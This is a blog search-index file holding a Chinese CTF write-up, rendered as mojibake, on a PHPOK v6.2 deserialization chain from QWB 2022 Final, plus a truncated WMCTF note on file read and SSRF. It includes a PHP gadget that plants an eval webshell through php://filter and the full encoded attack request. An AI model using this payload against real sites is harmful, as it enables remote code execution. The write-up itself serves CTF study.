<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NS - QWB 2022</title>
      <link href="/2022/08/22/QWB%202022%20FINAL/"/>
      <url>/2022/08/22/QWB%202022%20FINAL/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å®¡å®¡PHP</p></blockquote><h1 id="QWB-FINAL-CMS-PHPOK-v6-2"><a href="#QWB-FINAL-CMS-PHPOK-v6-2" class="headerlink" title="QWB FINAL - CMS (PHPOK v6.2)"></a>QWB FINAL - CMS (PHPOK v6.2)</h1><p>ä¸Šæ¬¡å®¡è®¡PHPè¿˜æ˜¯åœ¨å¤§äºŒï¼Œæ¢äº†ç”µè„‘åä¹Ÿä¸€ç›´æ²¡æœ‰é…ç½®xdebugç¯å¢ƒï¼Œå¯¼è‡´å½“å¤©åªèƒ½ç¡¬ç€å¤´çš®çœ‹ä»£ç ï¼Œçœ‹äº†ä¸€å¤©åå…¥å£å’Œå‡ºå£éƒ½æ‰¾åˆ°äº†ï¼Œå¯æƒœæ²¡æ³•debugä¸çŸ¥é“å‡½æ•°å’Œå‚æ•°çš„æƒ…å†µï¼ŒåŠ ä¹‹å¯¹ä¸€äº›å‡½æ•°æ•æ„Ÿåº¦ä¸å¤Ÿï¼Œé”™è¿‡äº†ã€‚ä»Šå¤©å°±ä¸“é—¨æŠ½äº†ä¸€ä¸‹åˆæ—¶é—´æ¥é…ç½®ç¯å¢ƒå’Œdebugè¿™ä¸ªæ´</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>ç¯å¢ƒé…ç½®æœ‰ç‚¹æŠ˜è…¾äººï¼Œå› ä¸ºç»™äº†dockerfileï¼Œä½†m1proæœ‰ç‚¹æï¼Œæ‰€ä»¥è®°å½•ä¸‹è¸©çš„å‘ã€‚</p><p>é¦–å…ˆï¼Œå®˜æ–¹ç»™çš„Dockerfileï¼Œåœ¨æ­¤åŸºç¡€ä¸Šæ·»åŠ php7.2-xdebugè¿›è¡Œå®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">ENV DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line">COPY sources.list /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">RUN apt-get update &amp;&amp; apt-get install apache2 -y</span><br><span class="line">COPY apache2.conf /etc/apache2/apache2.conf</span><br><span class="line">COPY smity2.tar.gz /root/smity2.tar.gz</span><br><span class="line">COPY flag /flaaaaaaggggggggggg</span><br><span class="line">COPY study.sql /root/study.sql</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get install -y mariadb-server mariadb-client unzip software-properties-common php7.2 php7.2-xml php7.2-mysqli php7.2-xmlrpc php7.2-soap php7.2-intl php7.2-gd php7.2-zip php7.2-mbstring libapache2-mod-php php-xml php-xmlrpc php-soap php-intl php-gd php-zip php-mbstring unzip php7.2-xdebug vim</span><br><span class="line"></span><br><span class="line">RUN groupadd www \</span><br><span class="line">    &amp;&amp; useradd --shell /sbin/nologin -g www www \</span><br><span class="line">    &amp;&amp; rm -rf /var/www/html/* \</span><br><span class="line">    &amp;&amp; tar zxvf /root/smity2.tar.gz -C / \</span><br><span class="line">    &amp;&amp; chmod 755 -R /var/www/html \</span><br><span class="line">    &amp;&amp; chmod 777 -R /var/www/html/_* \</span><br><span class="line">    &amp;&amp; chmod 777 -R /var/www/html/task/ \</span><br><span class="line">    &amp;&amp; service mysql start \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;create user phpok identified by &#x27;phpok&#x27;;&quot; \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;create database phpok;use phpok;source /root/study.sql;&quot; \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;grant all on phpok.* to phpok@&#x27;localhost&#x27; identified by &#x27;phpok&#x27; with grant option;&quot; \</span><br><span class="line">    &amp;&amp; mysql -uroot -proot -e &quot;flush privileges;&quot; \</span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/* \</span><br><span class="line">    &amp;&amp; chmod 644 /flaaaaaaggggggggggg \</span><br><span class="line">    &amp;&amp; a2enmod rewrite \</span><br><span class="line">    &amp;&amp; service apache2 restart</span><br><span class="line"></span><br><span class="line">ENTRYPOINT service apache2 restart &amp;&amp; service mysql restart &amp;&amp; sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ›¿æ¢source.listä¸ºarm64ç”¨çš„ï¼Œéœ€è¦å¯¹åº”ä¸Šubuntuç‰ˆæœ¬ï¼Œè¿™é‡Œæ˜¯18.04ç‰¹æœ‰ï¼Œåˆ«çš„ä¼šæŠ¥é”™ï¼ˆå®æµ‹ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic main universe restricted</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic main universe restricted</span><br></pre></td></tr></table></figure><p>ç„¶åé…ç½®docker-composeæ–¹ä¾¿å¯åŠ¨ï¼Œéœ€è¦æ³¨æ„ç¯å¢ƒçš„php.iniæ˜¯è¦æ›¿æ¢apache2ç›®å½•çš„è€Œécliç›®å½•çš„ï¼ŒåŒæ—¶ç•™æ„ä¸éœ€è¦æ˜ å°„9000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:</span><br><span class="line">  myimg:</span><br><span class="line">    image: myimg:0.1</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">    ports:</span><br><span class="line">      - 8081:80</span><br><span class="line">      # - 9000:9000</span><br><span class="line">    volumes:</span><br><span class="line">      - ./var/www/html/:/var/www/html/</span><br><span class="line">      - ./php.ini:/etc/php/7.2/apache2/php.ini</span><br><span class="line">    stdin_open: true</span><br><span class="line">    tty: true</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯åœ¨php.iniä¸­è¿½åŠ xdebugçš„å‚æ•°ï¼Œè¿™é‡Œæ˜¯åœ¨ç½‘ä¸Šæ‰¾çš„åŸºç¡€ä¸Šæ”¹çš„ï¼Œä½†æ˜¯åŸç‰ˆé‡Œé¢æœ‰ä¸€è¡Œç”¨#æ³¨é‡Šçš„å†…å®¹ï¼Œåœ¨vscodeé‡Œçœ‹èµ·æ¥ä¸€ç‚¹æ¯›ç—…ä¹Ÿæ²¡æœ‰ï¼Œä½†æ˜¯è§£æphp.iniæ—¶ä¼šå‡ºé”™ï¼Œä½†æ˜¯å¯¹äºapache2çš„é‡å¯æ²¡æœ‰ä»»ä½•å½±å“ï¼ˆåç»­é€šè¿‡/var/logç›¸å…³æ—¥å¿—æ’æŸ¥å‡ºæ¥çš„ï¼‰ï¼Œåœ¨è¿™é‡Œè¸©äº†å‘ï¼Œéœ€ç•™æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=&quot;/usr/lib/php/20170718/xdebug.so&quot;</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_host=&quot;192.168.xx.xx&quot;</span><br><span class="line">xdebug.remote_port=&quot;9000&quot;</span><br><span class="line">xdebug.remote_log=&quot;/var/log/php/xdebug.log&quot;</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.idekey=&quot;outx&quot;</span><br><span class="line"></span><br><span class="line">;å¯ç”¨ä»£ç è‡ªåŠ¨è·Ÿè¸ª</span><br><span class="line">xdebug.auto_trace = On</span><br><span class="line">;å¯ç”¨æ€§èƒ½æ£€æµ‹åˆ†æ</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.profiler_output_name = &quot;profiler.out.%t.%p&quot;</span><br></pre></td></tr></table></figure><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>æ ¹æ®å‘¨æœ«ç¡¬çœ‹äº†ä¸€å¤©çš„æˆæœï¼Œpopé“¾æ˜¯ç°æˆçš„ï¼Œåˆ©ç”¨framework/engine/cache.phpä¸­çš„cacheç±»ï¼Œç•™æ„ææ„æ–¹æ³•å’Œsaveæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">//echo &quot;&lt;pre&gt;&quot;.print_r($this-&gt;key_list,true).&quot;&lt;/pre&gt;&quot;;</span><br><span class="line">//echo &quot;&lt;pre&gt;&quot;.print_r(count($this-&gt;key_list),true).&quot;&lt;/pre&gt;&quot;;</span><br><span class="line">$this-&gt;save($this-&gt;key_id,$this-&gt;key_list);</span><br><span class="line">$this-&gt;expired();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function save($id,$content=&#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">if(!$id || $content === &#x27;&#x27; || !$this-&gt;status)&#123;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">$this-&gt;_time();</span><br><span class="line">$content = serialize($content);</span><br><span class="line">$file = $this-&gt;folder.$id.&quot;.php&quot;;</span><br><span class="line">file_put_contents($file,&#x27;&lt;?php exit();?&gt;&#x27;.$content);</span><br><span class="line">$this-&gt;_time();</span><br><span class="line">$this-&gt;_count();</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“æ—¶ä¸ºä»€ä¹ˆæ‰¾åˆ°è¿™ä¸ªåœ°æ–¹å‘¢ï¼Œå°±æ˜¯ä»file_put_contentsè¿™ä¸ªsinkç‚¹æœè¿‡æ¥çš„ï¼Œç„¶åç¡®å®šäº†è¿™ä¸ªé“¾æ˜¯å¯ä»¥æ‰“ååºåˆ—åŒ–çš„ï¼Œè¿™é‡Œå¯ä»¥ç”¨php://filterç»•è¿‡è¿™ä¸ªexit</p><p>æ„é€ class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class cache </span><br><span class="line">&#123;</span><br><span class="line">  protected $timeout = 1800;</span><br><span class="line">protected $status = true;</span><br><span class="line">protected $prefix = &#x27;qinggan_&#x27;;</span><br><span class="line">protected $keyfile = &#x27;&#x27;;</span><br><span class="line">protected $folder = &#x27;php://filter/string.rot13/resource=/var/www/html/_cache/&#x27;;</span><br><span class="line">protected $key_id = &#x27;outx&#x27;;</span><br><span class="line">protected $key_list = &#x27;&lt;?cuc riny($_CBFG[\&#x27;bhgk\&#x27;]);?&gt;&#x27;;</span><br><span class="line">protected $debug = false;</span><br><span class="line">protected $time;</span><br><span class="line">//</span><br><span class="line">private $time_use = 0;</span><br><span class="line">private $time_tmp = 0;</span><br><span class="line">private $count = 0;</span><br><span class="line">&#125;</span><br><span class="line">echo(urlencode(urlencode(serialize(new cache())))); // ä¸¤æ¬¡ç¼–ç ä¸»è¦æ˜¯ä¸ºäº†ç¬¬ä¸€æ¬¡ä¼ é€’è¿›å»ä¸å½±å“åç»­è§£æ</span><br><span class="line"></span><br><span class="line">O%253A5%253A%2522cache%2522%253A12%253A%257Bs%253A10%253A%2522%2500%252A%2500timeout%2522%253Bi%253A1800%253Bs%253A9%253A%2522%2500%252A%2500status%2522%253Bb%253A1%253Bs%253A9%253A%2522%2500%252A%2500prefix%2522%253Bs%253A8%253A%2522qinggan_%2522%253Bs%253A10%253A%2522%2500%252A%2500keyfile%2522%253Bs%253A0%253A%2522%2522%253Bs%253A9%253A%2522%2500%252A%2500folder%2522%253Bs%253A56%253A%2522php%253A%252F%252Ffilter%252Fstring.rot13%252Fresource%253D%252Fvar%252Fwww%252Fhtml%252F_cache%252F%2522%253Bs%253A9%253A%2522%2500%252A%2500key_id%2522%253Bs%253A4%253A%2522outx%2522%253Bs%253A11%253A%2522%2500%252A%2500key_list%2522%253Bs%253A29%253A%2522%253C%253Fcuc%2Briny%2528%2524_CBFG%255B%2527bhgk%2527%255D%2529%253B%253F%253E%2522%253Bs%253A8%253A%2522%2500%252A%2500debug%2522%253Bb%253A0%253Bs%253A7%253A%2522%2500%252A%2500time%2522%253BN%253Bs%253A15%253A%2522%2500cache%2500time_use%2522%253Bi%253A0%253Bs%253A15%253A%2522%2500cache%2500time_tmp%2522%253Bi%253A0%253Bs%253A12%253A%2522%2500cache%2500count%2522%253Bi%253A0%253B%257D</span><br></pre></td></tr></table></figure><p>burp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api.php?c=call&amp;f=index&amp;data=&#123;%22m_picplayer%22:%220%26type_id%3Dformat_ext_all%26x%5Bform_type%5D%3Durl%26x%5Bcontent]=O%253A5%253A%2522cache%2522%253A12%253A%257Bs%253A10%253A%2522%2500%252A%2500timeout%2522%253Bi%253A1800%253Bs%253A9%253A%2522%2500%252A%2500status%2522%253Bb%253A1%253Bs%253A9%253A%2522%2500%252A%2500prefix%2522%253Bs%253A8%253A%2522qinggan_%2522%253Bs%253A10%253A%2522%2500%252A%2500keyfile%2522%253Bs%253A0%253A%2522%2522%253Bs%253A9%253A%2522%2500%252A%2500folder%2522%253Bs%253A56%253A%2522php%253A%252F%252Ffilter%252Fstring.rot13%252Fresource%253D%252Fvar%252Fwww%252Fhtml%252F_cache%252F%2522%253Bs%253A9%253A%2522%2500%252A%2500key_id%2522%253Bs%253A4%253A%2522outx%2522%253Bs%253A11%253A%2522%2500%252A%2500key_list%2522%253Bs%253A29%253A%2522%253C%253Fcuc%2Briny%2528%2524_CBFG%255B%2527bhgk%2527%255D%2529%253B%253F%253E%2522%253Bs%253A8%253A%2522%2500%252A%2500debug%2522%253Bb%253A0%253Bs%253A7%253A%2522%2500%252A%2500time%2522%253BN%253Bs%253A15%253A%2522%2500cache%2500time_use%2522%253Bi%253A0%253Bs%253A15%253A%2522%2500cache%2500time_tmp%2522%253Bi%253A0%253Bs%253A12%253A%2522%2500cache%2500count%2522%253Bi%253A0%253B%257D%22&#125; HTTP/1.1</span><br></pre></td></tr></table></figure><h2 id="Track-It"><a href="#Track-It" class="headerlink" title="Track It"></a>Track It</h2><p>æ¥ä¸‹æ¥å°±ä¸€æ­¥ä¸€æ­¥ä»sourceåˆ°sinkç‚¹åˆ†æ</p><blockquote><p>framework/api/call_control.php#index_f()ï¼Œå¯¹åº”åˆ°URLåˆ™æ˜¯api.php?c=call&amp;f=indexï¼Œä¸­é—´å‚æ•°å†™åˆ°æ³¨é‡Šä¸­äº†</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public function index_f()</span><br><span class="line">&#123;</span><br><span class="line">$data = $this-&gt;get(&#x27;data&#x27;,&#x27;html&#x27;);</span><br><span class="line">...</span><br><span class="line">if(substr($data,0,1) == &#x27;&#123;&#x27;)&#123;</span><br><span class="line">$data = $this-&gt;lib(&#x27;json&#x27;)-&gt;decode(stripslashes($data)); //è§£æjsonï¼Œå†™æˆé”®å€¼å¯¹</span><br><span class="line">if($data)&#123;</span><br><span class="line">$data = $this-&gt;format($data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">//åŸºäºæ¥å£ç¦ç”¨SQL</span><br><span class="line">$is_error = false;</span><br><span class="line">foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">if(isset($value[&#x27;type_id&#x27;]))&#123; //$key = &quot;m_picplayer&quot; $value=&quot;0&amp;type_id=format_ext_all....&quot;</span><br><span class="line">$is_error = true;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($is_error)&#123;</span><br><span class="line">$this-&gt;error(P_Lang(&#x27;ç³»ç»Ÿç¦æ­¢æ”¹å†™ç±»å‹å‚æ•°&#x27;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$call_all = $this-&gt;model(&#x27;call&#x27;)-&gt;all($this-&gt;site[&#x27;id&#x27;],&#x27;identifier&#x27;);</span><br><span class="line">$is_ok = false;</span><br><span class="line">$rslist = array();</span><br><span class="line">foreach($data as $key=&gt;$value)&#123;</span><br><span class="line">//æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦æœ‰å¼€æ”¾SQLè°ƒç”¨</span><br><span class="line">...</span><br><span class="line">//æ˜æ–‡ä¼ è¾“å°†ç¦ç”¨sqlextå’Œsqlinfo</span><br><span class="line">if(isset($value[&#x27;sqlext&#x27;]))&#123;</span><br><span class="line">unset($value[&#x27;sqlext&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($value[&#x27;sqlinfo&#x27;]))&#123;</span><br><span class="line">unset($value[&#x27;sqlinfo&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">if($call_all &amp;&amp; $call_all[$key] &amp;&amp; $call_all[$key][&#x27;is_api&#x27;])&#123; // $call_all[$key][&#x27;is_api&#x27;] = 1</span><br><span class="line">$tmpValue = $value;</span><br><span class="line">$fid = $key;</span><br><span class="line">..</span><br><span class="line">$rslist[$fid] = phpok($key,$tmpValue); // å…³é”®ç‚¹ -&gt; framework/phpok_tpl_helper.php</span><br><span class="line">$is_ok = true;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>framework/phpok_tpl_helper.php#phpok($id=&#39;&#39;,$ext=&quot;&quot;)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function phpok($id=&#x27;&#x27;,$ext=&quot;&quot;) // $ext=&quot;0&amp;type_id=format_ext_all....&quot; $id=&quot;m_picplayer&quot;</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">$count = func_num_args();</span><br><span class="line">if($count&lt;=2)&#123;</span><br><span class="line">return $GLOBALS[&#x27;app&#x27;]-&gt;call-&gt;phpok($id,$ext); // å…³é”® -&gt; framework/phpok_call.php</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>framework/phpok_call.php#phpok($id,$rs=&quot;&quot;)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public function phpok($id,$rs=&quot;&quot;)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">//æ ¼å¼åŒ–å‚æ•°</span><br><span class="line">if($rs &amp;&amp; is_string($rs))&#123;</span><br><span class="line">parse_str($rs,$rs); //parse_str å°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">// å‘$rsä¸­æ·»åŠ äº†ä¸¤ä¸ªå­—æ®µsiteå’Œ_baseurl</span><br><span class="line">if(substr($id,0,1) != &#x27;_&#x27;)&#123;</span><br><span class="line">$call_rs = $this-&gt;load_phpoklist($id,$rs[&#x27;site&#x27;]); // ä»$id=m_picplayerä¸­è·å–ä¿¡æ¯</span><br><span class="line">...</span><br><span class="line">if($rs &amp;&amp; is_array($rs))&#123;</span><br><span class="line">$call_rs = array_merge($call_rs,$rs); // åé¢çš„å€¼è¦†ç›–å‰é¢çš„ï¼Œå…³é”®ç‚¹ï¼Œåˆ©ç”¨$rsä¸­çš„type_idè¦†ç›–æ‰$call_rsçš„</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">$func = &#x27;_&#x27;.$call_rs[&#x27;type_id&#x27;];</span><br><span class="line">if(!in_array($func,$this-&gt;mlist))&#123; // $this-mlistå¯ç”¨_format_ext_allæ‰“ååºåˆ—åŒ–å’Œ_sqlæ‰“ä»»æ„sqlæ³¨å…¥ç„¶ååœ¨åˆ«å¤„è§¦å‘ååºåˆ—åŒ–</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">return $this-&gt;$func($call_rs,$cache_id); å…³é”®ç‚¹ $func = _format_ext_all -&gt; framework/phpok_call.php $call_rs[&#x27;x&#x27;]æ˜¯æˆ‘ä»¬æ§åˆ¶çš„ååºåˆ—åŒ–æ•°æ®</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>framework/phpok_call.php#_format_ext_all($rslist)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private function _format_ext_all($rslist)</span><br><span class="line">&#123;</span><br><span class="line">$res = &#x27;&#x27;;</span><br><span class="line">foreach($rslist as $key=&gt;$value)&#123; $valueä¸ºæˆ‘ä»¬è®¾ç½®çš„xæ—¶</span><br><span class="line">if($value[&#x27;form_type&#x27;] == &#x27;url&#x27; &amp;&amp; $value[&#x27;content&#x27;])&#123;</span><br><span class="line">$value[&#x27;content&#x27;] = unserialize($value[&#x27;content&#x27;]); //è§¦å‘ååºåˆ—åŒ–</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åˆ°è¿™é‡Œï¼Œè¿™ä¸ªæ´è·Ÿå®Œäº†ï¼Œå®é™…ä¸Šå¹¶ä¸å¤æ‚ï¼Œå¯æƒœå½“æ—¶æ²¡æœ‰ç¯å¢ƒèƒ½çœ‹çœ‹å¤„ç†æµç¨‹ï¼Œä¸ç„¶æ„Ÿè§‰è‡ªå·±åº”è¯¥å¯ä»¥å®Œæˆè¿™ä¸ª0dayçš„å®¡è®¡çš„ï¼ä¸è¿‡ä¸€åˆ‡éƒ½åœ¨å˜å¥½ï¼Œç»§ç»­åŠªåŠ›ğŸ˜„</p><h1 id="WMCTF-JAVA"><a href="#WMCTF-JAVA" class="headerlink" title="WMCTF - JAVA"></a>WMCTF - JAVA</h1><blockquote><p>æ‡’ï¼Œå°±å†™åœ¨è¿™é‡Œäº†ï¼Œç²¾åŠ›éƒ½ç»™qwbäº†ï¼Œåªåšäº†ä¸€é“web</p></blockquote><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ç»™äº†ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯è¿™ä¸ªä»»æ„æ–‡ä»¶è¯»å–å¯ä»¥åˆ—ç›®å½•ï¼Œæ¯”è¾ƒç¥å¥‡ï¼Œè¯»äº†Javaçš„ç›®å½•ï¼Œæ²¡æœ‰ä»€ä¹ˆæœ‰æ„æ€çš„ä¸œè¥¿ï¼Œä½†æ˜¯åœ¨è¯»ç¯å¢ƒå˜é‡çš„æ—¶å€™ç¿»åˆ°äº†ä¸€äº›k8sçš„é…ç½®ï¼Œå°±åœ¨æƒ³æ˜¯ä¸æ˜¯è¦ssrfæ‰“å†…ç½‘ã€‚</p><p>è¯»å–/proc/self/cwdç›®å½•æ—¶æœ‰å¾ˆå¤štomcatçš„æ—¥å¿—ï¼Œåœ¨catalinaçš„æ—¥å¿—ä¸­ç¿»åˆ°äº†ä¸€äº›é—è½ä¿¡æ¯ï¼Œæ¯”å¦‚æ‰“äº†10.244.0.160:8080è¿™ç§ï¼Œäºæ˜¯æ”¾å¼€æ‰‹æ‰«è¿™ä¸ªcæ®µï¼ˆå…¶å®æŒ‰ç†è¯´åº”è¯¥æ˜¯ç¿»åˆ°é…ç½®ï¼Œæœ‰ä¸ª10æ®µçš„å†…ç½‘åœ°å€ï¼Œç„¶åæ‰«bæ®µçš„ï¼Œè¿™é‡Œå–å·§äº†ï¼Œå› ä¸ºçœ‹é¢˜çš„æ—¶å€™å·²ç»å¾ˆè¿Ÿäº†ï¼‰ï¼Œç„¶åæ‰«åˆ°äº†spark</p><p>åœ¨ssrfç‚¹è¿‡æ»¤äº†åå¼•å·ï¼Œåå¼•å·çš„urlç¼–ç ï¼Œåå¼•å·urlç¼–ç çš„urlç¼–ç 